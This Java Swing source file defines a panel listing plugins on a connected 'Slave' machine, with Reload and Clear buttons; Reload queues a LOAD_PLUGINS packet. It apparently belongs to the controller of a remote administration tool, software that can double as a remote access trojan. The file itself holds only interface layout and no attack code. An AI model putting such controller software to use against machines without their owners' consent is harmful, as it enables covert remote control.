package com.redpois0n.ui.panels;


import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JButton;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.table.DefaultTableModel;

import com.redpois0n.Slave;
import com.redpois0n.packets.OutgoingHeader;
import com.redpois0n.ui.renderers.table.PluginTableRenderer;

@SuppressWarnings("serial")
public class PanelControlPlugins extends PanelControlParent {
	
	private JTable table;
	
	public JTable getTable() {
		return table;
	}
	
	public DefaultTableModel getModel() {
		return (DefaultTableModel)table.getModel();
	}

	public PanelControlPlugins(Slave sl) {
		super(sl);
		
		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
		
		JButton btnReload = new JButton("Reload");
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
				slave.addToSendQueue(OutgoingHeader.LOAD_PLUGINS);
			}
		});
		btnReload.setIcon(new ImageIcon(PanelControlPlugins.class.getResource("/icons/update.png")));
		
		JButton btnClear = new JButton("Clear");
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				clear();
			}
		});
		btnClear.setIcon(new ImageIcon(PanelControlPlugins.class.getResource("/icons/clear.png")));
		GroupLayout groupLayout = new GroupLayout(this);
		groupLayout.setHorizontalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addGroup(groupLayout.createParallelGroup(Alignment.LEADING)
						.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 599, GroupLayout.PREFERRED_SIZE)
						.addGroup(groupLayout.createSequentialGroup()
							.addContainerGap()
							.addComponent(btnReload)
							.addPreferredGap(ComponentPlacement.RELATED)
							.addComponent(btnClear)))
					.addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
		);
		groupLayout.setVerticalGroup(
			groupLayout.createParallelGroup(Alignment.LEADING)
				.addGroup(groupLayout.createSequentialGroup()
					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 303, GroupLayout.PREFERRED_SIZE)
					.addPreferredGap(ComponentPlacement.RELATED)
					.addGroup(groupLayout.createParallelGroup(Alignment.BASELINE)
						.addComponent(btnReload)
						.addComponent(btnClear))
					.addContainerGap(18, Short.MAX_VALUE))
		);
		
		table = new JTable();
		table.setDefaultRenderer(Object.class, new PluginTableRenderer());
		table.setRowHeight(25);
		table.setModel(new DefaultTableModel(
			new Object[][] {
			},
			new String[] {
				"Name", "Author", "Description", "Version"
			}
		) {
			public boolean isCellEditable(int i, int i1) {
				return false;
			}
		});
		table.getColumnModel().getColumn(0).setPreferredWidth(142);
		table.getColumnModel().getColumn(1).setPreferredWidth(141);
		table.getColumnModel().getColumn(2).setPreferredWidth(238);
		scrollPane.setViewportView(table);
		setLayout(groupLayout);
	}
	
	public void clear() {
		while (getModel().getRowCount() > 0) {
			getModel().removeRow(0);
		}
	}
}
